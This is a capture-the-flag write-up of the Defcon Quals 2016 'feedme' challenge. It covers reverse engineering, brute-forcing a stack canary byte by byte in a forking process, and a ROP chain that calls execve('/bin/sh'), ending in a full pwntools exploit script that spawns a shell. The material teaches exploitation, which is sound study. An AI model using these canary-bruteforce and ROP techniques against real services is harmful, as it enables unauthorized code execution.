# Feedme

This is based off of a Raytheon SI Govs talk.

This is a challenge from Defcon Quals 2016. Let's take a look at the program:

```
$	./feedme 
FEED ME!
15935728
000000000000000000000000000000000000000000000000000
ATE 353933353732380a3030303030303030...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
789654123
75315982
00000000000000000000000000000000
ATE 3030303030303030300a373839363534...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
```

So we can see that when we run it, it prompts us for input. We can also see that it prints out our input. Also above all of that, we can see that we were able to overwrite a stack canary (which is why the `stack smashing detected` message appeared) so we probably have a stack based buffer overflow. In addition to that, when the canary is overwritten (which we can see has happened) the process kills itself, however we can see here that it keeps going. What is probably happening is there is a master process which spawns child processes, whcih we overflow a canary for those child processes, and thus the child process get's killed and the master process can just spawn more child processes. Let's take a look at what type of binary this is:
```
$	file feedme 
feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
$	pwn checksec feedme 
[*] '/Hackery/defcon16/feedme/feedme'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Looking at this binary, we can see that it is a 32 bit, statically linked, stripped elf. The fact that it is statically linked means that all of it's functions are compiled with the program, so it won't be making any libc calls. The fact that it is stripped means that when we go to RE it, all of the function names (and a lot of other things) will be stripped from the binary, making it harder to RE. We can see that NX is enabled, so we won't be able to jump to shellcode on the stack. It also says that the stack canary is not found, however that is because it is looking for a libc call for the function which checks the stack canary, and since it is statically linked that call doesn't exist (but it does have a stack canary).

## Reversing

```
int child_main()
{
  unsigned __int8 size; // ST1B_1@1
  int ptr; // eax@1
  int v2; // ecx@1
  int result; // eax@1
  char input; // [sp+1Ch] [bp-2Ch]@1
  int stack_canary; // [sp+3Ch] [bp-Ch]@1

  stack_canary = *MK_FP(__GS__, 20);
  puts((int)"FEED ME!");
  size = get_int();
  scan_in_memory(&input, size);
  ptr = sub_8048F6E(&input, size, 16);
  printf("ATE %s\n", ptr);
  result = size;
  if ( *MK_FP(__GS__, 20) != stack_canary )
    stack_canary_fail(v2, *MK_FP(__GS__, 20) ^ stack_canary);
  return result;
}
```

So this is what the code looks like, after we have done a lot of renaming. We can see the stack canary established at the top, and the check for it down at the bottom.  The first function we can see called is `puts` (the reason why I say it is puts, is because it prints out a single static string passed to it just like puts, I didn't RE the function). After that we can see the function `get_int` is called, which prompts the user for input and returns the first byte as an integer. Proceeding that, we can see that the function `scan_in_memory` is called. The arguments for that are `input` and `size`. Using a bit of dynamic analysis we can see that the amount of bytes that `scan_in_memory` is equivalent to `size` (the breakpoints I set for this were `b *0x8049069` and `b *0x8049084`, which are the calls for `get_int` and `scan_in_memory` functions). Also dynamic analysis also tells us that `sub_8048F6E` just returns a pointer to 16 bytes of our input:

```
gdb-peda$ r
Child exit.
FEED ME!
Starting program: /Hackery/defcon16/feedme/feedme 
[New process 16130]
FEED ME!
[Switching to process 16130]

[----------------------------------registers-----------------------------------]
EAX: 0x9 ('\t')
EBX: 0x80481a8 (push   ebx)
ECX: 0x80eb4d4 --> 0x0 
EDX: 0x9 ('\t')
ESI: 0x0 
EDI: 0x80ea00c --> 0x8067f90 (mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffd0c8 --> 0xffffd0f8 --> 0xffffd118 --> 0x8049970 (push   ebx)
ESP: 0xffffd080 --> 0x80be70c ("FEED ME!")
EIP: 0x8049053 (call   0x8048e42)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049045:	xor    eax,eax
   0x8049047:	mov    DWORD PTR [esp],0x80be70c
   0x804904e:	call   0x804fc60
=> 0x8049053:	call   0x8048e42
   0x8049058:	mov    BYTE PTR [ebp-0x2d],al
   0x804905b:	movzx  eax,BYTE PTR [ebp-0x2d]
   0x804905f:	mov    DWORD PTR [esp+0x4],eax
   0x8049063:	lea    eax,[ebp-0x2c]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd080 --> 0x80be70c ("FEED ME!")
0004| 0xffffd084 --> 0x0 
0008| 0xffffd088 --> 0x0 
0012| 0xffffd08c --> 0x806ccb7 (sub    esp,0x20)
0016| 0xffffd090 --> 0x80ea200 --> 0xfbad2887 
0020| 0xffffd094 --> 0x80ea247 --> 0xeb4d40a 
0024| 0xffffd098 --> 0x80ea248 --> 0x80eb4d4 --> 0x0 
0028| 0xffffd09c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 6.1 "feedme" hit Breakpoint 1, 0x08049053 in ?? ()
gdb-peda$ c
Continuing.
9

[----------------------------------registers-----------------------------------]
EAX: 0xffffd09c --> 0x0 
EBX: 0x80481a8 (push   ebx)
ECX: 0xffffd06b --> 0x139 
EDX: 0x1 
ESI: 0x0 
EDI: 0x80ea00c --> 0x8067f90 (mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffd0c8 --> 0xffffd0f8 --> 0xffffd118 --> 0x8049970 (push   ebx)
ESP: 0xffffd080 --> 0xffffd09c --> 0x0 
EIP: 0x8049069 (call   0x8048e7e)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804905f:	mov    DWORD PTR [esp+0x4],eax
   0x8049063:	lea    eax,[ebp-0x2c]
   0x8049066:	mov    DWORD PTR [esp],eax
=> 0x8049069:	call   0x8048e7e
   0x804906e:	movzx  eax,BYTE PTR [ebp-0x2d]
   0x8049072:	mov    DWORD PTR [esp+0x8],0x10
   0x804907a:	mov    DWORD PTR [esp+0x4],eax
   0x804907e:	lea    eax,[ebp-0x2c]
Guessed arguments:
arg[0]: 0xffffd09c --> 0x0 
arg[1]: 0x39 ('9')
[------------------------------------stack-------------------------------------]
0000| 0xffffd080 --> 0xffffd09c --> 0x0 
0004| 0xffffd084 --> 0x39 ('9')
0008| 0xffffd088 --> 0x0 
0012| 0xffffd08c --> 0x806ccb7 (sub    esp,0x20)
0016| 0xffffd090 --> 0x80ea200 --> 0xfbad2887 
0020| 0xffffd094 --> 0x80ea247 --> 0xeb4d40a 
0024| 0xffffd098 --> 0x390ea248 
0028| 0xffffd09c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 6.1 "feedme" hit Breakpoint 2, 0x08049069 in ?? ()
gdb-peda$ 
Continuing.
000000000000000000000000000000000000000000000000001111122222

[----------------------------------registers-----------------------------------]
EAX: 0xffffd09c ('0' <repeats 50 times>, "1111122")
EBX: 0x80481a8 (push   ebx)
ECX: 0xffffd09c ('0' <repeats 50 times>, "1111122")
EDX: 0x39 ('9')
ESI: 0x0 
EDI: 0x80ea00c --> 0x8067f90 (mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffd0c8 ("0000001111122")
ESP: 0xffffd080 --> 0xffffd09c ('0' <repeats 50 times>, "1111122")
EIP: 0x8049084 (call   0x8048f6e)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804907a:	mov    DWORD PTR [esp+0x4],eax
   0x804907e:	lea    eax,[ebp-0x2c]
   0x8049081:	mov    DWORD PTR [esp],eax
=> 0x8049084:	call   0x8048f6e
   0x8049089:	mov    DWORD PTR [esp+0x4],eax
   0x804908d:	mov    DWORD PTR [esp],0x80be715
   0x8049094:	call   0x804f700
   0x8049099:	movzx  eax,BYTE PTR [ebp-0x2d]
Guessed arguments:
arg[0]: 0xffffd09c ('0' <repeats 50 times>, "1111122")
arg[1]: 0x39 ('9')
arg[2]: 0x10 
[------------------------------------stack-------------------------------------]
0000| 0xffffd080 --> 0xffffd09c ('0' <repeats 50 times>, "1111122")
0004| 0xffffd084 --> 0x39 ('9')
0008| 0xffffd088 --> 0x10 
0012| 0xffffd08c --> 0x806ccb7 (sub    esp,0x20)
0016| 0xffffd090 --> 0x80ea200 --> 0xfbad2887 
0020| 0xffffd094 --> 0x80ea247 --> 0xeb4d40a 
0024| 0xffffd098 --> 0x390ea248 
0028| 0xffffd09c ('0' <repeats 50 times>, "1111122")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 6.1 "feedme" hit Breakpoint 3, 0x08049084 in ?? ()
gdb-peda$ 222
Undefined command: "222".  Try "help".
gdb-peda$ find 0000000000000000000000000000000000000000000000000000000
Searching for '0000000000000000000000000000000000000000000000000000000' in: None ranges
Not found
gdb-peda$ find 1111
Searching for '1111' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0xffffd0ce ("1111122")
gdb-peda$ x/x 0xffffd0ce
0xffffd0ce:	0x31
gdb-peda$ x/w 0xffffd0ce
0xffffd0ce:	0x31313131
gdb-peda$ x/4w 0xffffd0ce
0xffffd0ce:	0x31313131	0x00323231	0xd8400000	0xf8b4080e
gdb-peda$ x/4w 0xffffd0be
0xffffd0be:	0x30303030	0x30303030	0x30303030	0x30303030
gdb-peda$ x/4w 0xffffd0ae
0xffffd0ae:	0x30303030	0x30303030	0x30303030	0x30303030
gdb-peda$ x/20w 0xffffd0ae
0xffffd0ae:	0x30303030	0x30303030	0x30303030	0x30303030
0xffffd0be:	0x30303030	0x30303030	0x30303030	0x30303030
0xffffd0ce:	0x31313131	0x00323231	0xd8400000	0xf8b4080e
0xffffd0de:	0x00000804	0x00000000	0x00000000	0x81a80000
0xffffd0ee:	0x81a80804	0x00000804	0xd1180000	0x91daffff
gdb-peda$ x/20w 0xffffd08e
0xffffd08e:	0xa2000806	0xa247080e	0xa248080e	0x3030390e
0xffffd09e:	0x30303030	0x30303030	0x30303030	0x30303030
0xffffd0ae:	0x30303030	0x30303030	0x30303030	0x30303030
0xffffd0be:	0x30303030	0x30303030	0x30303030	0x30303030
0xffffd0ce:	0x31313131	0x00323231	0xd8400000	0xf8b4080e
```

So we can see here that the byte I provided for `get_int` was the ASCII value `9` which in hex is `0x39`, so `0x39` was the value stored in the `size` integer, and passed to `scan_in_memory`. We can also see that out of the `60` bytes of input we provided to `scan_in_memory`, it only scanned in `57` bytes, which is equivalent to `0x39` (the same value we passed into `get_int`) so we effictively control how much input is scanned in. Let's see how much data we need to input in order to reach the stack canary and return address (picking up from where we left in gdb):

```
gdb-peda$ x/w 0xffffd09c
0xffffd09c:	0x30303030
gdb-peda$ i f
Stack level 0, frame at 0xffffd0d0:
 eip = 0x8049084; saved eip = 0x31313030
 called by frame at 0xffffd0d4
 Arglist at 0xffffd0c8, args: 
 Locals at 0xffffd0c8, Previous frame's sp is 0xffffd0d0
 Saved registers:
  ebp at 0xffffd0c8, eip at 0xffffd0cc
gdb-peda$ x/x $ebp-0xc
0xffffd0bc:	0x30303030
```

So we can see that our input starts at `0xffffd09c` (if you don't believe me, go back a byte), the return address is stored at `0xffffd0cc`, and the stack canary is stored at `0xffffd0bc` (which we have overwritten with zeroes). Doing some python math gives us the offsets:
```
>>> hex(0xffffd0bc - 0xffffd09c)
'0x20'
>>> hex(0xffffd0cc - 0xffffd09c)
'0x30'
```

So we can see that the offset from the stack canary is `0x20`, and the offset to the return address is `0x30`. This makes since since the char array `input` is stored at `ebp-0x2c`, the stack canary is stored at `ebp-0xc`, and the return address is stored at `ebp+0x4`. Doing some math gives us `0x2c - 0xc = 0x20` and `0x2c + 0x4 = 0x30`. Now that we have this function reversed, let's see where it is called:

```
void main_we_care_about()
{
  unsigned __int8 bytes_scanned_in; // al@3
  int v1; // [sp+10h] [bp-18h]@1
  unsigned int i; // [sp+14h] [bp-14h]@1
  int v3; // [sp+18h] [bp-10h]@2
  int v4; // [sp+1Ch] [bp-Ch]@4

  v1 = 0;
  for ( i = 0; i <= 0x31F; ++i )
  {
    v3 = sub_806CC70();
    if ( !v3 )
    {
      bytes_scanned_in = child_main();
      printf("YUM, got %d bytes!\n", bytes_scanned_in);
      return;
    }
    v4 = sub_806CBE0(v3, &v1, 0);
    if ( v4 == -1 )
    {
      puts((int)"Wait error!");
      sub_804ED20(-1);
    }
    if ( v1 == -1 )
    {
      puts((int)"Child IO error!");
      sub_804ED20(-1);
    }
    puts((int)"Child exit.");
    sub_804FA20(0);
  }
}
```

So looking at this, we notice a couple of different things. First of all, if our function doesn't crash it will print out the format string `YUM, got %d bytes!\n` where `%d` is the number of bytes you scanned in. Secondly that our function is ran in a for loop `0x320` (or 800) times.

## Exploiting

#### Stack Canary

So to exploit this, we have a stack overflow bug that we can use. However there is a stack canary in the way, that we will have to know it's value prior to overwriting it (so we can overwrite it to itself), otherwise it will crash before we ever get code execution. However what we can do is brute force the stack canary one byte at a time. There are `256` different possible comibations for each byte, so it will take at most `256` attempts to guess a byte. Since there are four bytes the maximum amount of attempts it will take to brute force 4 bytes individually is `256 * 4 = 1024`. Our limit is `800`, and so we should be good to brute force it (we probably won't reach near the max for each byte). We can brute force it one byte at a time, by just overwriting one byte at a time, start at `0x0` and increment it by one untill we see the string `YUM` which means that the stack canary is correct, and we can move on to the next byte. In addition to that, stack canaries in modern linux distributions are null terminated, meaning that the last byte will always be `0x00`. With that, we will know what the first byte is, and only have to brute fore 3 bytes.

#### ROP Chain

After that, we will have the stack canary and nothing will be able to stop us from getting code execution. Then the question comes up of what to execute. NX is turned on, so we can't jump to shellcode we place at the stack. However the elf doesn't have PIE (randomizes the address of code) enabled, so building a ROP chain without an infoleak is possible. For this ROP Chain, I will be making a syscall to `/bin/sh`, which would grant us a shell.

First we look for ROP gadgets using the tool ROPgadget (since this is a statically linked binary, there will be a lot of gadgets):

```
$	python ROPgadget.py --binary feedme
```

Looking throught the list of ROP gagdets, we see a few useful gadgets:
```
0x0807be31 : mov dword ptr [eax], edx ; ret
```

This gadget is extremely useful. What this will allow us to do is move the contents of the `edx` register into the area of space pointed to by the address of `eax`, then return. So if we wanted to write to the address `1234`, we could load that address into `eax`, and the value we wanted to write into the `edx` register, then call this gadget.

```
0x080bb496 : pop eax ; ret
```

This gadget is helpful since it will allow us to pop a value off of the stack into the `eax` register to use, then return to allow us to continue the ROP Chain.

```
0x0806f34a : pop edx ; ret
```

This gadget is similar to the previous one, except it is with the `edx` register instead of the `eax` register.


```
0x0806f371 : pop ecx ; pop ebx ; ret
```

This gadget is so we can control the value of the `ecx` register. Unfortunately there are no gadgets that will just pop a value into the `ecx` register then return, so this is the next best thing (using this gadget will save us not having to use another gadget when we pop a value into the `ebx` register however). 

```
0x08049761 : int 0x80
```

This gadget is a syscall, which will allow us to make a syscall to the kernell to get a shell (to get a syscall in x86, you can call `int 0x80`). Syscall will expect three arguments, the interger `11` in `eax` for the syscall number, the bss address `0x80eb928` in the `ebx` register for the address of the command, and the value `0x0` in the `ecx` and `edx` registers (syscall will look for arguments in those registers, however we don't need them so we should just set them to null). For more info on syscalls check out https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux

Now we are going to have to write the string `/bin/sh` somewhere in memory, at an address that we know in order to pass it as an argument it the syscall. What we can do for this, is write it to the bss address `0x80eb928`. Since it is in the bss, it will have a static address, so we don't need an infoleak to write to and call it.


With that, we get the following ROP Chain:

```
# This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0x80eb928)	# bss address
payload += p32(0x0806f34a)	# pop edx
payload	+= p32(0x6e69622f)	# /bin string in hex, in little endian
payload += p32(0x0807be31)	# mov dword ptr [eax], edx ; ret

# Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0x80eb928 + 0x4)	# bss address + 0x4 to write after '/bin'
payload += p32(0x0806f34a)	# pop edx
payload	+= p32(0x0068732f)	# /sh string in hex, in little endian
payload += p32(0x0807be31)	# mov dword ptr [eax], edx ; ret

# Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0xb)			# 11
payload += p32(0x0806f371)	# pop ecx ; pop ebx ; ret
payload += p32(0x0)			# 0x0
payload += p32(0x80eb928)	# bss address
payload += p32(0x0806f34a)	# pop edx ; ret
payload += p32(0x0)			# 0x0
payload += p32(0x8049761)	# syscall
```

## Exploit

Putting it all together, we get the following exploit:
```
# First we import pwntools
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
	# We know that the first byte of the stack canary has to be \x00 since it is null terminated, keep the values we know for the canary in known_canary
	known_canary = "\x00"
	# Ascii representation of the canary
	hex_canary = "00"
	# The current canary which will be incremented
	canary = 0x0
	# The number of bytes we will give as input
	inp_bytes = 0x22
	# Iterate 3 times for the three bytes we need to brute force
	for j in range(0, 3):
		# Iterate up to 0xff times to brute force all posible values for byte
		for i in xrange(0xff):
			log.info("Trying canary: " + hex(canary) + hex_canary) 
			
			# Send the current input size
			target.send(p32(inp_bytes)[0])

			# Send this iterations canary
			target.send("0"*0x20 + known_canary + p32(canary)[0])

			# Scan in the output, determine if we have a correct value
			output = target.recvuntil("exit.")
			if "YUM" in output:
				# If we have a correct value, record the canary value, reset the canary value, and move on
				print "next byte is: " + hex(canary)
				known_canary = known_canary + p32(canary)[0]
				inp_bytes = inp_bytes + 1
				new_canary = hex(canary)
				new_canary = new_canary.replace("0x", "")
				hex_canary = new_canary + hex_canary
				canary = 0x0
				break
			else:
				# If this isn't the canary value, increment canary by one and move onto next loop
				canary = canary + 0x1

	# Return the canary
	return int(hex_canary, 16)

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info("The canary is: " + hex(canary))


# Now that we have the canary, we can start making our final payload

# This will cover the space up to, and including the canary
payload = "0"*0x20 + p32(canary)

# This will cover the rest of the space between the canary and the return address
payload += "1"*0xc

# Start putting together the ROP Chain

# This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0x80eb928)	# bss address
payload += p32(0x0806f34a)	# pop edx
payload	+= p32(0x6e69622f)	# /bin string in hex, in little endian
payload += p32(0x0807be31)	# mov dword ptr [eax], edx ; ret

# Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0x80eb928 + 0x4)	# bss address + 0x4 to write after '/bin'
payload += p32(0x0806f34a)	# pop edx
payload	+= p32(0x0068732f)	# /sh string in hex, in little endian
payload += p32(0x0807be31)	# mov dword ptr [eax], edx ; ret

# Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0xb)			# 11
payload += p32(0x0806f371)	# pop ecx ; pop ebx ; ret
payload += p32(0x0)			# 0x0
payload += p32(0x80eb928)	# bss address
payload += p32(0x0806f34a)	# pop edx ; ret
payload += p32(0x0)			# 0x0
payload += p32(0x8049761)	# syscall

# Send the amount of bytes for our payload, and the payload itself
target.send("\x78")
target.send(payload)

# Drop to an interactive shell
target.interactive()
```

when we run it:
```
$	python exploit.py 
[+] Starting local process './feedme': pid 19157
[*] Trying canary: 0x000
[*] Trying canary: 0x100
[*] Trying canary: 0x200
[*] Trying canary: 0x300
[*] Trying canary: 0x400
.	.	.
FEED ME!
ATE 30303030303030303030303030303030...
$ w
 03:08:55 up  4:57,  1 user,  load average: 0.87, 0.85, 0.90
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               22:13    4:55m 11:33   0.02s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
core  exploit.py  feedme  peda-session-feedme.txt  readme.md  try.py
$ 
[*] Interrupted
[*] Stopped process './feedme' (pid 19157)

```
